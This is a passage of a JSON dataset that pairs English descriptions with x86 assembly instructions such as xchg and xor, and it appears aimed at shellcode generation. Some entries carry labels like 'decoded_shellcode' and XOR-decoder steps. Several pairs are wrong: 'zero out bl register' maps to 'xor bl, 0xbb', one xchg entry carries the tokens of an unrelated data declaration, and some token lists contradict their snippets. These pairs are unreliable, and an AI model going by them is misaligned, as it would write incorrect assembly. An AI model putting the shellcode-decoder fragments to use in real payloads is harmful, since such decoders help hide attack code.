      "label"
    ],
    "snippet_tokens": [
      "write",
      ":"
    ]
  },
  {
    "intent": "define writestring function",
    "rewritten_intent": "define writestring function",
    "snippet": "writestring:",
    "slot_map": {
      "writestring": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the writestring label",
    "rewritten_intent": "declare the writestring label",
    "snippet": "writestring:",
    "slot_map": {
      "writestring": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare a word uninitialized value referred to as location x",
    "rewritten_intent": "declare a word uninitialized value referred to as location x",
    "snippet": "x dw ?",
    "slot_map": {
      "uninitialized": "var0"
    },
    "intent_tokens": [
      "declare",
      "word",
      "var0",
      "value",
      "referred",
      "location",
      "x"
    ],
    "snippet_tokens": [
      "x",
      "dw",
      "?"
    ]
  },
  {
    "intent": "declare an uninitialized word labeled x",
    "rewritten_intent": "declare an uninitialized word labeled x",
    "snippet": "x dw ?",
    "slot_map": {
      "uninitialized": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "word",
      "labeled",
      "x"
    ],
    "snippet_tokens": [
      "x",
      "dw",
      "?"
    ]
  },
  {
    "intent": "swap the address [ebp+16] with the contents of the ecx register",
    "rewritten_intent": "swap the address [ebp+16] with the contents of the ecx register",
    "snippet": "xchg [ebp+16], ecx",
    "slot_map": {
      "ebp+16": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "swap",
      "address",
      "[",
      "var1",
      "]",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "x",
      "dw",
      "?"
    ]
  },
  {
    "intent": "swap the contents of eax and ebx",
    "rewritten_intent": "swap the contents of eax and ebx",
    "snippet": "xchg eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the eax register with the contents of the ebx register",
    "rewritten_intent": "swap the contents of the eax register with the contents of the ebx register",
    "snippet": "xchg eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "exchange eax with ebx",
    "rewritten_intent": "exchange eax with ebx",
    "snippet": "xchg eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "exchange",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the eax register with the contents of the ecx register",
    "rewritten_intent": "swap the contents of the eax register with the contents of the ecx register",
    "snippet": "xchg eax, ecx",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the eax register with the contents of the edx register",
    "rewritten_intent": "swap the contents of the eax register with the contents of the edx register",
    "snippet": "xchg eax, edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of eax and esi",
    "rewritten_intent": "swap the contents of eax and esi",
    "snippet": "xchg eax, esi",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the eax register with the contents of the esi register",
    "rewritten_intent": "swap the contents of the eax register with the contents of the esi register",
    "snippet": "xchg eax, esi",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the ebx register with the contents of the eax register",
    "rewritten_intent": "swap the contents of the ebx register with the contents of the eax register",
    "snippet": "xchg ebx, eax",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of ebx and eax",
    "rewritten_intent": "swap the values of ebx and eax",
    "snippet": "xchg ebx, eax",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of ebx and eax registers",
    "rewritten_intent": "swap the values of ebx and eax registers",
    "snippet": "xchg ebx, eax",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "exchange the contents of the ebx register with the contents of the eax register",
    "rewritten_intent": "exchange the contents of the ebx register with the contents of the eax register",
    "snippet": "xchg ebx, eax",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "exchange",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "exchange ebx with ecx",
    "rewritten_intent": "exchange ebx with ecx",
    "snippet": "xchg ebx, ecx",
    "slot_map": {
      "ebx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "exchange",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the ebx register with the contents of the edx register",
    "rewritten_intent": "swap the contents of the ebx register with the contents of the edx register",
    "snippet": "xchg ebx, edx",
    "slot_map": {
      "ebx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the ebx register with the contents of the esp register",
    "rewritten_intent": "swap the contents of the ebx register with the contents of the esp register",
    "snippet": "xchg ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "swap the values of ebx and esp registers",
    "rewritten_intent": "swap the values of ebx and esp registers",
    "snippet": "xchg ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "esp",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "exchange ecx with edx",
    "rewritten_intent": "exchange ecx with edx",
    "snippet": "xchg ecx, edx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "exchange",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the ecx register with the contents of the edx register",
    "rewritten_intent": "swap the contents of the ecx register with the contents of the edx register",
    "snippet": "xchg ecx, edx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the edi register with the contents of the eax register",
    "rewritten_intent": "swap the contents of the edi register with the contents of the eax register",
    "snippet": "xchg edi, eax",
    "slot_map": {
      "edi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of edi and eax registers",
    "rewritten_intent": "swap the values of edi and eax registers",
    "snippet": "xchg edi, eax",
    "slot_map": {
      "edi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of edx and eax registers",
    "rewritten_intent": "swap the values of edx and eax registers",
    "snippet": "xchg edx, eax",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "exchange edx with eax",
    "rewritten_intent": "exchange edx with eax",
    "snippet": "xchg edx, eax",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "exchange",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of edx and ebx registers",
    "rewritten_intent": "swap the values of edx and ebx registers",
    "snippet": "xchg edx, ebx",
    "slot_map": {
      "edx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the contents of the esi register with the contents of the eax register",
    "rewritten_intent": "swap the contents of the esi register with the contents of the eax register",
    "snippet": "xchg esi, eax",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of esi and eax",
    "rewritten_intent": "swap the values of esi and eax",
    "snippet": "xchg esi, eax",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of esi and ebx",
    "rewritten_intent": "swap the values of esi and ebx",
    "snippet": "xchg esi, ebx",
    "slot_map": {
      "esi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xchg",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "swap the values of esp and esi registers",
    "rewritten_intent": "swap the values of esp and esi registers",
    "snippet": "xchg esp, esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "swap",
      "values",
      "esp",
      "and",
      "var0",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "swap the values si ebx and bx registers",
    "rewritten_intent": "swap the values si ebx and bx registers",
    "snippet": "xchg si, bx",
    "slot_map": {
      "ebx": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "swap",
      "values",
      "si",
      "var0",
      "and",
      "var1",
      "registers"
    ],
    "snippet_tokens": [
      "xchg",
      "si",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform xor operation between ebx register and the word __flag_byte and save the result in ebx",
    "rewritten_intent": "perform xor operation between ebx register and the word __flag_byte and save the result in ebx",
    "snippet": "xor [ebx], word __flag_byte",
    "slot_map": {
      "ebx": "var0",
      "__flag_byte": "var2"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "register",
      "and",
      "word",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "var0",
      "]",
      ",",
      "word",
      "var2"
    ]
  },
  {
    "intent": "perform xor operation between the value stored at the location ecx+116 and bh",
    "rewritten_intent": "perform xor operation between the value stored at the location ecx+116 and bh",
    "snippet": "xor [ecx + 116], bh",
    "slot_map": {
      "ecx+116": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "value",
      "stored",
      "location",
      "var0",
      "and",
      "bh"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "ecx",
      "+",
      "116",
      "]",
      ",",
      "bh"
    ]
  },
  {
    "intent": "perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116]",
    "rewritten_intent": "perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116]",
    "snippet": "xor [ecx + 116], bh",
    "slot_map": {
      "ecx + 116": "var2",
      "[": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "address",
      "specified",
      "[",
      "var2",
      "]",
      "and",
      "bh",
      "register",
      "and",
      "save",
      "result",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "ecx",
      "+",
      "116",
      "]",
      ",",
      "bh"
    ]
  },
  {
    "intent": "perform xor operation between the value stored at the location ecx+116 and dh",
    "rewritten_intent": "perform xor operation between the value stored at the location ecx+116 and dh",
    "snippet": "xor [ecx + 116], dh",
    "slot_map": {
      "ecx+116": "var0",
      "dh": "var1"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "value",
      "stored",
      "location",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "ecx",
      "+",
      "116",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116]",
    "rewritten_intent": "perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116]",
    "snippet": "xor [ecx + 116], dh",
    "slot_map": {
      "ecx + 116": "var2",
      "[": "var0",
      "dh": "var4"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "address",
      "specified",
      "[",
      "var2",
      "]",
      "and",
      "var4",
      "register",
      "and",
      "save",
      "result",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "ecx",
      "+",
      "116",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform the xor operation between the value stored at the location ecx and bh",
    "rewritten_intent": "perform the xor operation between the value stored at the location ecx and bh",
    "snippet": "xor [ecx], bh",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "value",
      "stored",
      "location",
      "var0",
      "and",
      "bh"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "var0",
      "]",
      ",",
      "bh"
    ]
  },
  {
    "intent": "perform the xor operation between the value stored at the location ecx and dh",
    "rewritten_intent": "perform the xor operation between the value stored at the location ecx and dh",
    "snippet": "xor [ecx], dh",
    "slot_map": {
      "ecx": "var0",
      "dh": "var1"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "value",
      "stored",
      "location",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "zero out ah register",
    "rewritten_intent": "zero out ah register",
    "snippet": "xor ah, ah",
    "slot_map": {
      "ah": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the ah register",
    "rewritten_intent": "clear the ah register",
    "snippet": "xor ah, ah",
    "slot_map": {
      "ah": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform a logical xor between the al register and 0e9h and save the result in al",
    "rewritten_intent": "perform a logical xor between the al register and 0e9h and save the result in al",
    "snippet": "xor al, 0e9h",
    "slot_map": {
      "0e9h": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "al",
      "register",
      "and",
      "var0",
      "and",
      "save",
      "result",
      "al"
    ],
    "snippet_tokens": [
      "xor",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between the al register and the value 0x30",
    "rewritten_intent": "perform the xor operation between the al register and the value 0x30",
    "snippet": "xor al, 0x30",
    "slot_map": {
      "0x30": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "al",
      "register",
      "and",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between the al register and the value 0x41",
    "rewritten_intent": "perform the xor operation between the al register and the value 0x41",
    "snippet": "xor al, 0x41",
    "slot_map": {
      "0x41": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "al",
      "register",
      "and",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between the ax register and the value 0x3041",
    "rewritten_intent": "perform the xor operation between the ax register and the value 0x3041",
    "snippet": "xor ax, 0x3041",
    "slot_map": {
      "0x3041": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "ax",
      "register",
      "and",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between the ax register and the value 0x4f73",
    "rewritten_intent": "perform the xor operation between the ax register and the value 0x4f73",
    "snippet": "xor ax, 0x4f73",
    "slot_map": {
      "0x4f73": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "ax",
      "register",
      "and",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero",
    "rewritten_intent": "jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero",
    "snippet": "xor ax, 0x539 \\n jz decoded_shellcode",
    "slot_map": {
      "decoded_shellcode": "var0",
      "0x539": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "logical",
      "xor",
      "ax",
      "register",
      "and",
      "value",
      "var1",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between the contents of the ax register and the value 0x7777",
    "rewritten_intent": "perform the xor operation between the contents of the ax register and the value 0x7777",
    "snippet": "xor ax, 0x7777",
    "slot_map": {
      "0x7777": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "contents",
      "ax",
      "register",
      "and",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the ax register",
    "rewritten_intent": "clear the ax register",
    "snippet": "xor ax, ax",
    "slot_map": {},
    "intent_tokens": [
      "clear",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "ax"
    ]
  },
  {
    "intent": "zero out ax register",
    "rewritten_intent": "zero out ax register",
    "snippet": "xor ax, ax",
    "slot_map": {},
    "intent_tokens": [
      "zero",
      "out",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "ax"
    ]
  },
  {
    "intent": "perform a logical xor between the bl register and 0xbb and save the result in bl",
    "rewritten_intent": "perform a logical xor between the bl register and 0xbb and save the result in bl",
    "snippet": "xor bl, 0xbb",
    "slot_map": {
      "0xbb": "var2",
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "zero out bl register",
    "rewritten_intent": "zero out bl register",
    "snippet": "xor bl, 0xbb",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "0xbb"
    ]
  },
  {
    "intent": "zero out bx register",
    "rewritten_intent": "zero out bx register",
    "snippet": "xor bx,bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]",
    "rewritten_intent": "perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]",
    "snippet": "xor byte [esi + ecx - 1], 0x3",
    "slot_map": {
      "esi + ecx - 1": "var2",
      "[": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "byte",
      "address",
      "specified",
      "[",
      "var2",
      "]",
      "and",
      "bh",
      "register",
      "and",
      "save",
      "result",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]",
    "rewritten_intent": "perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]",
    "snippet": "xor byte [esi], cl",
    "slot_map": {
      "esi": "var2",
      "[": "var0",
      "]": "var4"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "byte",
      "address",
      "specified",
      "[",
      "var2",
      "]",
      "and",
      "cl",
      "register",
      "and",
      "save",
      "result",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero",
    "rewritten_intent": "jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero",
    "snippet": "xor cl, 0x32 \\n jz short EncodedShellcode",
    "slot_map": {
      "EncodedShellcode": "var0",
      "0x32": "var1"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "label",
      "if",
      "result",
      "logical",
      "xor",
      "cl",
      "register",
      "and",
      "value",
      "var1",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var1",
      "\\n",
      "jz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "perform a logical xor between the cl register and 0xaa and save the result in cl",
    "rewritten_intent": "perform a logical xor between the cl register and 0xaa and save the result in cl",
    "snippet": "xor cl, 0xaa",
    "slot_map": {
      "0xaa": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "cl",
      "register",
      "and",
      "var0",
      "and",
      "save",
      "result",
      "cl"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between cl and 0xaa and store the result in cl",
    "rewritten_intent": "perform the xor operation between cl and 0xaa and store the result in cl",
    "snippet": "xor cl, 0xaa",
    "slot_map": {
      "0xaa": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "cl",
      "and",
      "var0",
      "and",
      "store",
      "result",
      "cl"
    ],
    "snippet_tokens": [
      "xor",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform a logical xor between the dl register and 0xbb and save the result in dl",
    "rewritten_intent": "perform a logical xor between the dl register and 0xbb and save the result in dl",
    "snippet": "xor dl, 0xbb",
    "slot_map": {
      "0xbb": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "dl",
      "register",
      "and",
      "var0",
      "and",
      "save",
      "result",
      "dl"
    ],
    "snippet_tokens": [
      "xor",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between dl and 0xbb and store the result in dl",
    "rewritten_intent": "perform the xor operation between dl and 0xbb and store the result in dl",
    "snippet": "xor dl, 0xbb",
    "slot_map": {
      "0xbb": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "dl",
      "and",
      "var0",
      "and",
      "store",
      "result",
      "dl"
    ],
    "snippet_tokens": [
      "xor",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform the xor operation between eax register and edi register and store the result in eax",
    "rewritten_intent": "perform the xor operation between eax register and edi register and store the result in eax",
    "snippet": "xor eax, [edi]",
    "slot_map": {
      "eax": "var0",
      "edi": "var2"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "store",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "[",
      "var2",
      "]"
    ]
  },
  {
    "intent": "perform xor operation between eax register and esi register and store the result in eax",
    "rewritten_intent": "perform xor operation between eax register and esi register and store the result in eax",
    "snippet": "xor eax, [esi]",
    "slot_map": {
      "eax": "var0",
      "esi": "var2"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "register",
      "and",
      "var2",
      "register",
      "and",
      "store",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "[",
      "var2",
      "]"
    ]
  },
  {
    "intent": "perform the xor operation between eax and 0x58494741 value and store the result in eax",
    "rewritten_intent": "perform the xor operation between eax and 0x58494741 value and store the result in eax",
    "snippet": "xor eax, 0x58494741",
    "slot_map": {
      "0x58494741": "var2",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "and",
      "var2",
      "value",
      "and",
      "store",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform a logical xor between the eax register and 0x58494741 and save the result in eax",
    "rewritten_intent": "perform a logical xor between the eax register and 0x58494741 and save the result in eax",
    "snippet": "xor eax, 0x58494741",
    "slot_map": {
      "0x58494741": "var2",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform the xor operation between the eax register and the value 0x6e696230",
    "rewritten_intent": "perform the xor operation between the eax register and the value 0x6e696230",
    "snippet": "xor eax, 0x6e696230",
    "slot_map": {
      "0x6e696230": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "register",
      "and",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform a logical xor operation between eax and 0x7575",
    "rewritten_intent": "perform a logical xor operation between eax and 0x7575",
    "snippet": "xor eax, 0x7575",
    "slot_map": {
      "0x7575": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "operation",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform a logical xor between the eax register and 0xffffffff and save the result in eax",
    "rewritten_intent": "perform a logical xor between the eax register and 0xffffffff and save the result in eax",
    "snippet": "xor eax, 0xffffffff",
    "slot_map": {
      "0xffffffff": "var2",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "xor",
      "var0",
      "register",
      "and",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "initialize eax with decimal value 0",
    "rewritten_intent": "initialize eax with decimal value 0",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "decimal",
      "value",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform xor operation between eax and eax",
    "rewritten_intent": "perform xor operation between eax and eax",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "operation",
      "var0",
      "and",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "reset both lower and uppper bytes of eax to be 0",
    "rewritten_intent": "reset both lower and uppper bytes of eax to be 0",
    "snippet": "xor eax, eax",
    "slot_map": {
      "uppper": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "reset",
      "both",
      "lower",
      "and",
      "var0",
      "bytes",
      "var1",
      "be",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "reset eax",
    "rewritten_intent": "reset eax",
    "snippet": "xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "reset",
